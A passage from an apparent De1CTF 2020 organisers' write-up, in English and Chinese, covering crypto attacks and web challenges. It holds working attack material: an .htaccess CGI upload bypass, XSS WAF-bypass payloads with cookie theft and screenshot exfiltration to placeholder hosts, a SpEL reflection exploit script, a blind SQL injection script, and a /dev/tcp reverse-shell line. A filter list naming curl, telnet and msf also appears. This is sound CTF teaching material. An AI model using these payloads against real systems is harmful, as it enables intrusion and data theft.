20\)</span> , where 20 is a number large enough to cover up the noise.</p></li><li><p>Let: <span class="math inline">\(t_1 = Mx^i,t2 = M\)</span></p></li><li><p>Let ciphertext: <span class="math inline">\(c_0 = pk[0] + t_1,c1 = pk[1]+t_2\)</span></p></li><li><p>Send <span class="math inline">\(c = (c0,c1)\)</span> to server</p></li><li><p>The server will do this: <span class="math inline">\(c_0+c_1s = pk[0]+t_1+(pk[1]+t_2)s = -(as+e)+t_1+(a+t_2)s=e+t_1+t_2s\)</span></p><p>so the decryption result is all 0 except for the i-th bit, and the i-th bit is equal to the i-th bit of secret key <span class="math inline">\(s\)</span></p></li><li><p>Append the i-th bit of secret key <span class="math inline">\(s\)</span> to result array and back to step 1 until recover all the bits of secret key <span class="math inline">\(s\)</span></p></li><li><p>Use the secret key to decrypt flag</p></li></ol><p>Also because the task has a decrypt function with bad check function. We can use many other ways to decrypt flag too. Such as add a <span class="math inline">\(q\)</span> to the items of input <span class="math inline">\(c0\)</span> and <span class="math inline">\(c1\)</span>, add other small numbers or etc.</p><p>Reference:</p><p>https://arxiv.org/pdf/1906.07127.pdf</p><p>https://www.slideshare.net/ssuserbd9135/danger-of-using-fully-homomorphic-encryption-a-look-at-microsoft-seal-cansecwest2019</p><p>https://github.com/edwardz246003/danger-of-using-homomorphic-encryption</p><h2><span id="mini-purε-plus">Mini Purε Plus</span></h2><p><a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Mini%20Purε" target="_blank" rel="noopener">Mini Purε</a> is the crypto challenge of De1CTF 2019, this year I try to add the <em>ROUND</em> and give you data to attack.</p><p>Here is the solution:</p><p>Assume the input is <span class="math inline">\((C,x)\)</span> , the output is <span class="math inline">\((C_L,C_R)\)</span>, then we can easily get the coefficients of <span class="math inline">\(x^{3^{m-1}-1}\)</span> and <span class="math inline">\(x^{3^{m-1}-3}\)</span> in <span class="math inline">\(C_R\)</span> is <span class="math inline">\(k0\)</span> and <span class="math inline">\({k0}^3 + k1 + C\)</span> , where <span class="math inline">\(C\)</span> is a constant，<span class="math inline">\(x\)</span> is a variable and <span class="math inline">\(k0,k1\)</span> are the first and second round keys.</p><p>So we can use <a href="https://en.wikipedia.org/wiki/Integral_cryptanalysis" target="_blank" rel="noopener">Square attack</a> to find this: <span class="math display">\[\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}}C_R(x) = k0\]</span></p><p><span class="math display">\[\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}-2}C_R(x) = k0^3 + k1 + C\]</span></p><p>where <span class="math inline">\(n=24,m=16\)</span></p><p>Then we can get <span class="math inline">\(k0,k1\)</span> and get all keys to decrypt flag.</p><p>And thanks to <a href="https://redbud.info/ctfteam.html" target="_blank" rel="noopener">Redbud</a>, they provided an improved interpolation attack method. It also works.</p><p>Reference:</p><p>https://en.wikipedia.org/wiki/Integral_cryptanalysis</p><p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p><h2><span id="ov">OV</span></h2><p>This is a balanced oil and vinegar scheme. And it has been attacked by <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener">Kipnis and Shamir in 1998</a>.</p><p>So we can just use Kipnis-Shamir attack to solve this task.</p><p>However I made some mistakes in the <em>hashFunction</em>. It should be like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [K.fetch_int(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure><p>But I write it like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure><p>So there is a unexpected solution: just send <em>Iwanttoknowflag!</em> to sign and send the signed data to get flag.</p><p>And thanks to <a href="https://github.com/samueltangz" target="_blank" rel="noopener">Mystiz</a> , he helped me to find out the unexpected solution and improve my solution scripts.</p><p>Also thanks to <a href="https://github.com/hellman" target="_blank" rel="noopener">Hellman</a>, he reminded me of this mistake too.</p><p>Here is the excepted solution:</p><pre><code>We assume public key is $P: k^n \rightarrow k^o$ , where $o = v = 16,n = o+v$</code></pre><ol type="1"><li>Produce the corresponding symmetric matrices for the homogeneous quadratic parts of public key's polynomials: <span class="math inline">\(W_1,W_2,...,W_o\)</span>. Randomly choose two linear combination of <span class="math inline">\(W_1,W_2,...,W_o\)</span> and still denote them as <span class="math inline">\(W_1\)</span> and <span class="math inline">\(W_2\)</span> in which <span class="math inline">\(W_1,W_2\)</span> is invertible. Calculate <span class="math inline">\(W_{12} = W_1 * W^{-1}_2\)</span>.</li><li>Compute the characteristic polynomial of <span class="math inline">\(W_{12}\)</span> and find its linear factor of multiplicity 1. Denote such factor as <span class="math inline">\(h(x)\)</span>. Compute <span class="math inline">\(h(W_{12})\)</span> and its corresponding kernel.</li><li>For each vector <span class="math inline">\(O\)</span> in the kernel of step 2, use <span class="math inline">\(OW_iO=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span> to test if <span class="math inline">\(O\)</span> belongs to the hidden oil space. Choose linear dependent vectors among them and append them to set <span class="math inline">\(T\)</span>.</li><li>If <span class="math inline">\(T\)</span> contains only one vector or nothing, go back to step 1.</li><li>If necessary, find more vectors in <span class="math inline">\(T:O_3,O_4,...\)</span> Calculate <span class="math inline">\(K_{O_1} \bigcap ... \bigcap K_{O_t}\)</span> to find out the hidden Oil space in which <span class="math inline">\(K_{O_t}\)</span> is a space from which the vectors <span class="math inline">\(x\)</span> satisfy that <span class="math inline">\(O_tW_ix=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span>.</li><li>Extract a basis of hidden Oil space and extend it to a basis of <span class="math inline">\(k^n\)</span> and use it to transform the public key polynomials to basic Oil-Vinegar polynomials form.</li></ol><p>This write up doesn't write the whole content of Kipnis-Shamir attack, if you are interesting in it, you can see the papers in reference. Thanks.</p><p>PS: I have fixed these mistakes including word spelling mistake and generated the new source code. You can try to solve this task.</p><p>Reference:</p><p>http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf</p><p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p><p>https://link.springer.com/chapter/10.1007/978-3-319-38898-4_4</p><p>https://github.com/dsm501/Multivariate-cryptography-/blob/master/UOV%20Scheme.sagews</p><h2><span id="mc_noisemap">mc_noisemap</span></h2><p>Files: <a href="https://pastebin.com/P6YuDdBF" target="_blank" rel="noopener">exp.js</a> <a href="https://pastebin.com/gqwxugFC" target="_blank" rel="noopener">package.json</a> <a href="https://pastebin.com/vngikVFN" target="_blank" rel="noopener">www/map.html</a> <a href="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js" target="_blank" rel="noopener">www/assets/jquery.min.js</a> <a href="https://pastebin.com/EDna6NcL" target="_blank" rel="noopener">www/assets/noisemap.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/addons/p5.dom.js" target="_blank" rel="noopener">www/assets/p5.dom.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/p5.js" target="_blank" rel="noopener">www/assets/p5.js</a></p><p>The challenge is about <code>Image Identification</code>, modified basing on <a href="https://github.com/erdavids/Hex-Map" target="_blank" rel="noopener">erdavids/Hex-Map</a>.</p><p>My solution is not perfect. Perhaps there are some good ways to solve the challenge, I believe.</p><p>Just have a check on the exploit file <code>exp.js</code>.</p><p><code>De1CTF{MCerrr_L0v3_P3r1iN_N0IsE-M4p?}</code></p><h1><span id="web">web</span></h1><h2><span id="check-in">check in</span></h2><p><strong>本题考查点</strong>： 1.<code>.htaccess</code>文件的利用 2.linux环境下CGI的利用 文件上传时注意的几点: - MIME(content-type字段)校验 - 后缀名黑名单校验(<code>/ph|ml|js|cg/</code>) - 文件内容校验 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/perl|pyth|ph|auto|curl|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/</span><br></pre></td></tr></table></figure></p><p><strong>预期解</strong> .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure></p><p>1.xx: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure></p><p>注：这里讲下一个小坑，linux中cgi比较严格(2333333) 上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p><p><strong>非预期解 1</strong> 惨痛的教训 ！！！ 出题时坑有点多，所以忘记了<a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp" target="_blank" rel="noopener">2019xnuca中的ezphp</a>,所以许多师傅就利用<code>\</code>绕过了waf! (wtclll!!) .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .xx</span><br></pre></td></tr></table></figure></p><p>1.xx <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="string">'cat /flag'</span>;</span><br></pre></td></tr></table></figure></p><p><strong>非预期解 2</strong> 利用apache的服务器状态信息(默认关闭) .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure></p><p>上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录，可以利用次方法，可以白嫖flag。</p><h2><span id="animal-crossing">Animal crossing</span></h2><p>题目描述：</p><p>免费创建护照来展示你的岛屿！</p><h3><span id="第一关绕过云waf">第一关：绕过云WAF</span></h3><p>云WAF通常有好几层好几种过滤手段，这里我也是设计了了两层防护</p><h4><span id="第一层黑名单检测">第一层：黑名单检测</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="comment">//global</span></span><br><span class="line">    <span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</span><br><span class="line">    <span class="comment">//func</span></span><br><span class="line">    <span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</span><br><span class="line">    <span class="comment">//char</span></span><br><span class="line">    <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</span><br><span class="line">    <span class="comment">//key</span></span><br><span class="line">    <span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</span><br><span class="line">    <span class="comment">//string</span></span><br><span class="line">    <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p><h4><span id="第二层静态语法分析">第二层：静态语法分析</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 将data传入`fmt.Sprintf(&quot;&apos;%s&apos;;&quot;, data)`，然后进行语法解析，这里parse失败直接ban</span><br><span class="line">2. 接着遍历AST进行分析：</span><br><span class="line">   1. VariableExpression/AssignExpression，所有声明语句/赋值语句直接ban</span><br><span class="line">   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban</span><br><span class="line">      1. ban：`test.test()`、`a[x]()`</span><br><span class="line">      2. pass：`test()`</span><br><span class="line">   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，</span><br><span class="line">      1. ban：`a[1]`、`a[&apos;xx&apos;]`</span><br><span class="line">      2. pass：`a[x]`</span><br></pre></td></tr></table></figure><p>这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多</p><p>预期解payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=base64code<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></span><br></pre></td></tr></table></figure><p>绕过WAF的两层防护之后本地能成功alert就可以用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</span><br></pre></td></tr></table></figure><p>打到管理员cookie了，cookie中包含一半的flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure><h3><span id="第二关读取400张图片">第二关：读取400张图片</span></h3><p>另外一半flag，题目给了hint：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管理员在做什么?</span><br></pre></td></tr></table></figure><p>读取管理员的document，会发现有400多张png图片，flag就藏在这些图片当中，这里设计的时候预设了下面几种解法：</p><ol type="1"><li>绕过CSP引入截图库，截图后把图片传到/upload，获取图片地址回传，然后下载图片</li><li>用for循环把400个图全部传到/upload，获取400个图片地址然后回传</li><li>直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接</li></ol><p>三种方法有简单的也有复杂的，国外三支队伍用的都是第三种，把所有图片dump出去（我猜大佬们没发现/upload接口 23333），而国内的选手用的是解法2，下面我详细介绍下绕过CSP引入截图库的解法，其他的方法也是类似，就不全写出来了（感兴趣的可以去看解出来的大佬们的wp）。</p><h4><span id="绕过csp引入截图库">绕过CSP引入截图库</span></h4><p>本题的主要功能是制造动森护照，主页是有一个上传文件接口的，利用/upload接口，可以上传任意png后缀的文件，然后用fetch读这个png文件，再eval一下，就可以绕过CSP引入html2canvas库并且执行了，上传的png文件如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line">html2canvas.js代码</span><br><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 截图-&gt;上传到upload-&gt;外传图片地址</span></span><br><span class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</span><br><span class="line">        url = <span class="string">"/upload"</span>,</span><br><span class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</span><br><span class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</span><br><span class="line">        form.append(<span class="string">"file"</span>, file)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: <span class="string">"POST"</span>,</span><br><span class="line">            body: form</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>这里我把截图操作的js也写到png里了，主要思路就是截图完用/upload传到服务器，获取返回的图片地址回传给攻击者</p><h4><span id="读取图片并执行">读取图片并执行</span></h4><p>把图片用/upload接口上传后，获取png地址，再用可控的js部分去读取这个图片再执行即可</p><p>读取并执行的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</span><br></pre></td></tr></table></figure><p>用绕过第一关的办法包装一下就可以了</p><p>最后提交到bot就能接收到管理员界面截图的地址了，直接下载就能看到另一半flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cool_GamE&#125;</span><br></pre></td></tr></table></figure><p>最后flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</span><br></pre></td></tr></table></figure><h2><span id="calc">calc</span></h2><h3><span id="1-challenge-info">1. challenge info</span></h3><p>Please calculate the content of file /flag http://106.52.164.141</p><h3><span id="2-design-document">2. design document</span></h3><p>I found there are many difference between spel's grammar and java's grammar. For example, in spel we can use 1.class to get the class java.lang.Integer, but in java, we cannot.</p><p>I want to design a challenge to let ctfers discovery these difference and construct a more complicated reflection chain instead of the copy the payload from the internet directly.</p><p>So, i use two technology to forbide normal payloads.</p><ol type="1"><li>blacklist filter:<ul><li>T(</li><li>#</li><li>new</li><li>java.lang</li><li>Runtime</li><li>exec.*(</li><li>getRuntime</li><li>ProcessBuilder</li><li>start</li><li>getClass</li><li>String</li></ul></li><li>rasp</li></ol><p>There may be 3 different way to solve: 1. bypass blacklist filter to use T or # or new keywords 2. bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag 3. close the rasp protection</p><h3><span id="3-exp">3. exp</span></h3><p>which scheme we want players to use is the scheme2:bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag. and i just give my exploit here. of course you can try other two schemes to solve this challenge (actually they are really feasible.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import commands</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_flag(target):</span><br><span class="line">    payload = &apos;1.class.forName(&quot;java.nio.file.Files&quot;).getMethod(&quot;readAllLines&quot;, 1.class.forName(&quot;java.nio.file.Path&quot;)).invoke(null, 1.class.forName(&quot;java.nio.file.Paths&quot;).getMethod(&quot;get&quot;, 1.class.forName(&quot;java.net.URI&quot;)).invoke(null, 1.class.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, 1.class.forName(&quot;java.la&quot;+&quot;ng.Str&quot;+&quot;ing&quot;)).invoke(null, &quot;file:///flag&quot;)))&apos;</span><br><span class="line">    print(&quot;payload&quot;, payload)</span><br><span class="line">    url = &quot;http://&#123;&#125;/spel/calc&quot;.format(target)</span><br><span class="line">    r = requests.get(url, params=&#123;&quot;calc&quot;: payload&#125;)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    get_flag(&quot;106.52.164.141&quot;)</span><br></pre></td></tr></table></figure><h3><span id="4-other-writeups">4. other writeups</span></h3><p>I am ashamed that there are more detailed writeups written by players. you can find here: https://ctftime.org/task/11491</p><h2><span id="mixture">mixture</span></h2><p>登陆进去之后发现member.php有<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://49.51.251.99/index.php&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;username&quot;:&quot;xxxxx&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;xxxxxxx&quot;,</span><br><span class="line">    &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    &quot;PHPSESSID&quot;: &quot;sou26piclav6f99h79k1l5vmbn&quot;</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">url=&quot;http://49.51.251.99/member.php?orderby=&quot;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in &apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;:</span><br><span class="line">        payload=&quot;|(mid((select password from member),&#123;&#125;,1)=&apos;&#123;&#125;&apos;)%2b1&quot;.format(i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        if r.content.index(&apos;tom&apos;)&lt;r.content.index(&apos;1000000&apos;):</span><br><span class="line">            print payload+&apos; ok&apos;</span><br><span class="line">            flag+=j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print payload</span><br><span class="line">//18a960a3a0b3554b314ebe77fe545c85</span><br></pre></td></tr></table></figure></p><p>跑出来的密码经过md5解密是goodlucktoyou</p><p>search.php中调用的Minclude函数对应了Minclude.so中的zip_Minclude函数</p><p>直接反编译会发现没有什么东西，看一下汇编会看到几句简单的花指令干扰了分析。patch一下把这些花指令去除后，函数的功能十分简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_Minclude</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  zend_value v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *parameter; <span class="comment">// [rsp+0h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">size_t</span> length; <span class="comment">// [rsp+8h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+70h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+74h] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  parameter = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = path;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">"s"</span>, &amp;parameter, &amp;length) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(path, parameter, length);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, path);</span><br><span class="line">    php_printf(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    fp = fopen(path, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fp )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !feof(fp) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fgetc(fp);</span><br><span class="line">        php_printf(<span class="string">"%c"</span>, v3);</span><br><span class="line">      &#125;</span><br><span class="line">      php_printf(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      php_printf(<span class="string">"no file\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v4.lval = zend_strpprintf(<span class="number">0L</span>L, <span class="string">"True"</span>);</span><br><span class="line">    return_value-&gt;value = v4;</span><br><span class="line">    return_value-&gt;u1.type_info = (*(_BYTE *)(v4.lval + <span class="number">5</span>) &amp; <span class="number">2u</span>) &lt; <span class="number">1</span> ? <span class="number">5126</span> : <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>zend_parse_parameters解析传进来的参数，"s"表示解析成字符串，parameter指向解析的结果，length存放长度。</p><p>接下来memcpy将结果拷贝到栈上，拷贝的长度为length，有可能会大于path的大小，造成栈溢出。</p><p>Path的内容会先输出一下，注意到v9这个地方保存了path的地址，是为了防止本地的地址偏移和远程不一样，方便大家利用传递参数，。</p><p>函数本身的功能是任意文件读，给web服务使用。这样也可以读取/proc/self/maps，拿到libc地址。</p><p>有了libc地址就能随便rop了，直接调用system("...")即可。</p><p>要注意，参数不要直接用栈上path中的数据，因为函数结束后平衡了栈，这里的数据已经变成无用的了，执行system的时候可能会讲这里的内容覆盖掉，导致无法反弹shell</p><p>反弹shell的时候发现<code>/bin/bash -i &gt;&amp; /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0&gt;&amp;1</code>这样弹不了，换了一个脚本弹可以了。</p><p>如果想要调试的话，需要本地搭好环境后，gdb /usr/local/bin/php，然后set breakpoint pending on，就可以下断点调试了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 